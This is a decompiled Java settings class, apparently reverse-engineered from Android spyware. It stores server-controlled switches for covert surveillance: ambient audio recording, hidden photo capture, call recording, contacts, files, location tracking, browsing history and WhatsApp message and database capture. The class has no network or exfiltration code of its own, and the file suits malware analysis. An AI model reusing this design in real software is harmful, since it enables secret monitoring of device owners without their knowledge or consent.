package com.security;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import com.android.system.CoreApp;
import com.android.system.LocationService;
import com.google.gson.JsonSyntaxException;
import com.google.gson.a.d;
import com.google.gson.f;
import com.google.gson.g;
import com.security.d.a;

public class ServiceSettings
{
  private static final String TAG = "ServiceSettings";
  public static final int VERSION = 2;
  static ServiceSettings _instance;
  @d(a=1.0D)
  public boolean ambPhotoActive = true;
  @d(a=1.0D)
  public boolean ambRecActive = true;
  @d(a=1.0D)
  public boolean appListActive = true;
  @d(a=1.0D)
  public boolean callListActive = true;
  @d(a=1.0D)
  public boolean callRecActive = true;
  @d(a=1.0D)
  public boolean contactsActive = true;
  @d(a=1.0D)
  public boolean filesActive = true;
  @d(a=1.0D)
  public boolean gpsAndCellsActive = true;
  @d(a=1.0D)
  public boolean ipAddressActive = true;
  @d(a=2.0D)
  public boolean loggingEnabled = true;
  @d(a=1.0D)
  public boolean smsActive = false;
  @d(a=1.0D)
  public boolean urlActive = true;
  @d(a=1.0D)
  public boolean whatsappActive = true;
  @d(a=1.0D)
  public boolean whatsappDbActive = true;
  @d(a=1.0D)
  public boolean whatsappRtActive = true;
  @d(a=1.0D)
  public boolean wifiOnlySend = true;
  
  private ServiceSettings()
  {
    c();
  }
  
  public static ServiceSettings a()
  {
    if (_instance == null) {
      _instance = new ServiceSettings();
    }
    return _instance;
  }
  
  public static void a(String paramString)
  {
    for (int i = 2; i >= 1; i--) {
      if (a(i, paramString)) {
        return;
      }
    }
  }
  
  public static boolean a(int paramInt, String paramString)
  {
    try
    {
      Object localObject = new com/google/gson/g;
      ((g)localObject).<init>();
      localObject = (ServiceSettings)((g)localObject).a(paramInt).b().a(paramString, ServiceSettings.class);
      if (localObject == null)
      {
        a.d("ServiceSettings", "initFromJson(versione %d) fallita", new Object[] { Integer.valueOf(paramInt) });
        return false;
      }
      _instance = (ServiceSettings)localObject;
      _instance.b();
      a.e("ServiceSettings", "Nuovo Set di funzionalita' ricevuto dal server", new Object[0]);
      a.e("ServiceSettings", paramString, new Object[0]);
      return true;
    }
    catch (Exception paramString)
    {
      a.a("ServiceSettings", "initFromJson", new Object[] { paramString });
      return false;
    }
    catch (JsonSyntaxException paramString)
    {
      a.a("ServiceSettings", "initFromJson", new Object[] { paramString });
    }
    return false;
  }
  
  public void a(String paramString, boolean paramBoolean)
  {
    SharedPreferences.Editor localEditor = CoreApp.a().getSharedPreferences("pref", 0).edit();
    localEditor.putBoolean(paramString, paramBoolean);
    localEditor.commit();
  }
  
  public void b()
  {
    SharedPreferences.Editor localEditor = CoreApp.a().getSharedPreferences("pref", 0).edit();
    localEditor.putBoolean("list-calls-active", this.callListActive);
    localEditor.putBoolean("call-active", this.callRecActive);
    localEditor.putBoolean("contact-active", this.contactsActive);
    localEditor.putBoolean("gps-active", this.gpsAndCellsActive);
    localEditor.putBoolean("sms-active", false);
    localEditor.putBoolean("whatsapp-im-active", this.whatsappRtActive);
    localEditor.putBoolean("url-active", this.urlActive);
    localEditor.putBoolean("app-log-active", this.appListActive);
    localEditor.putBoolean("files-active", this.filesActive);
    localEditor.putBoolean("ambient-record-active", this.ambRecActive);
    localEditor.putBoolean("shoot-photo-active", this.ambPhotoActive);
    localEditor.putBoolean("media-data-transfered-by-wifi-only", this.wifiOnlySend);
    localEditor.putBoolean("logging-enabled", this.loggingEnabled);
    localEditor.commit();
    if (!this.gpsAndCellsActive) {
      CoreApp.a().stopService(new Intent(CoreApp.a(), LocationService.class));
    } else {
      CoreApp.a().startService(new Intent(CoreApp.a(), LocationService.class));
    }
  }
  
  public boolean b(String paramString)
  {
    return CoreApp.a().getApplicationContext().getSharedPreferences("pref", 0).getBoolean(paramString, false);
  }
  
  public void c()
  {
    SharedPreferences localSharedPreferences = CoreApp.a().getApplicationContext().getSharedPreferences("pref", 0);
    this.callListActive = localSharedPreferences.getBoolean("list-calls-active", true);
    this.callRecActive = localSharedPreferences.getBoolean("call-active", true);
    this.contactsActive = localSharedPreferences.getBoolean("contact-active", true);
    this.gpsAndCellsActive = localSharedPreferences.getBoolean("gps-active", true);
    this.smsActive = false;
    this.whatsappRtActive = localSharedPreferences.getBoolean("whatsapp-im-active", true);
    this.urlActive = localSharedPreferences.getBoolean("url-active", true);
    this.appListActive = localSharedPreferences.getBoolean("app-log-active", true);
    this.filesActive = localSharedPreferences.getBoolean("files-active", true);
    this.ambRecActive = localSharedPreferences.getBoolean("ambient-record-active", true);
    this.ambPhotoActive = localSharedPreferences.getBoolean("shoot-photo-active", true);
    this.wifiOnlySend = localSharedPreferences.getBoolean("media-data-transfered-by-wifi-only", true);
    this.loggingEnabled = localSharedPreferences.getBoolean("logging-enabled", true);
  }
}


/* Location:              ~/com/security/ServiceSettings.class
 *
 * Reversed by:           J
 */